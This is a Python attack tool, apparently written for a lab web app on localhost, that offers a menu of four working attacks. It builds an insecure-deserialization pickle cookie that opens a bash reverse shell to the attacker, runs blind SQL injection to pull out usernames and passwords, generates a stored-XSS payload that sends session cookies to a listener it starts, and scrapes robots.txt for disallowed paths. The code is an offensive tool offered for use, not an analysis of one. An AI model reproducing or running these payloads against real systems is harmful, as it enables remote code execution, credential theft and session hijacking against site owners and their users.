#!/usr/bin/python3

import _pickle as cPickle
from base64 import b64decode,b64encode
import subprocess, socket, requests, string, json
import requests
from urllib import parse, robotparser
import http.server as SimpleHTTPServer
import socketserver as SocketServer
import time
from urllib.parse import urlparse, parse_qs



def cookiegen():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()

    class User(object):
        def __init__(self, name):
            self.name = name
        def __reduce__(self):                                                                             
            import os
            return(os.system,(f"bash -c 'exec bash -i &>/dev/tcp/{ip}/9999 <&1'",))

    user = User("HACKER")
    bad_cookie = b64encode(cPickle.dumps(user))
    print("[!] New cookie: " + bad_cookie.decode("utf-8"))

def blindsqli():
    url = 'http://localhost/login'
    username = ""
    password = ""

    # Get list of usernames
    f = open("usernames.txt","r")
    usernames = f.readlines()
    f.close()

    # Try to get username
    req = requests.Session()
    for user in usernames:
        username = user.replace("\n","")
        data = {'username': f"{username}' -- ", 'password': 'dummy_password1'}
        req.post(url, data = data)
        if req.cookies.get_dict():
            print("[!] Username is : " + username)
            break
    
    # Try to get password
    done = False
    while not done:
        for c in string.printable:
            req = requests.Session()
            if c not in ["*","+",".","?","|","'","\"","\\","%"]:
                payload = username + "' AND password LIKE '" + password + c + "%' -- //"
                data = {'username': payload, 'password': 'dummy_password2'}
                req.post(url, data = data)
            
            # If logged in add char to password
            if req.cookies.get_dict():
                password += c
                print("[?] Password: " + password, end="\r")
                break

            if c == string.printable[-1]:
                done = True
                if password != '':
                    print("[!] Password is: " + password)
                else:
                    print("[!] Password not found")

def storedxss():
    cookies = set()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    payload = f"<h1>Get pwned</h1><img src='https://images.fineartamerica.com/images/artworkimages/mediumlarge/2/cat-hacker-irina-kuznetsova-iridi.jpg'></img><script>new Image().src=\"http://{ip}:9999/pwn?\"+document.cookie;</script>"
    print("[!] Payload: " + payload)
    # Python http server
    PORT = 9999
    
    class MyHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
        def do_GET(self):
            query_components = parse_qs(urlparse(self.path).query)
            if 'value' in query_components:
                cookie = query_components["value"][0]
                cookies.add(cookie)
                print(cookie)
            return 
        
        def do_POST(self):
            if self.path.startswith('/kill_server'):
                print("Server is going down, run it again manually!")
                def kill_me_please(server):
                    server.shutdown()
                thread.start_new_thread(kill_me_please, (httpd,))
                self.send_error(500)
    
    class MyTCPServer(SocketServer.TCPServer):
        def server_bind(self):
            import socket
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(self.server_address) 

    server_address = ('', 9999)
    httpd = MyTCPServer(server_address, MyHandler)
    print("[!] Server starting...")
    try:
        print("[!] Server up (press ctrl+c to quit)")
        print("[!] Cookies stolen:")
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()


def robots_reccon():
    AGENT_NAME = 'tottallynotabot'
    URL_BASE = 'http://localhost/'
    parser = robotparser.RobotFileParser()
    parser.set_url(parse.urljoin(URL_BASE, 'robots.txt'))
    parser.read()
    out = str(parser).split("\n")
    print("[!] Disallowed entries on robots.txt:")
    for line in out:
        info = line.split(" ")
        if(info != [] and info[0] == "Disallow:"):
            print("[!] " + info[1])

def main():
    prompt = " ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ _________ \n||P |||o |||o |||r |||s |||p |||l |||o |||i |||t |||       ||\n||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||_______||\n|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/_______\| (Metasploit at home™️)"
    print(prompt)
    while True:
        print("\n[?] Choose one of the options:\n       1 - SQli\n       2 - Insecure Deserialization\n       3 - XSS\n       4 - Forced Browsing\n       5 - quit")
        inpt = input("> ")
        if(inpt=="1"):
            blindsqli()
        elif(inpt=="2"):
            cookiegen()
        elif(inpt=="3"):
            storedxss()
        elif(inpt=="4"):
            robots_reccon()
        else:
            break

if __name__ == "__main__":
    main()
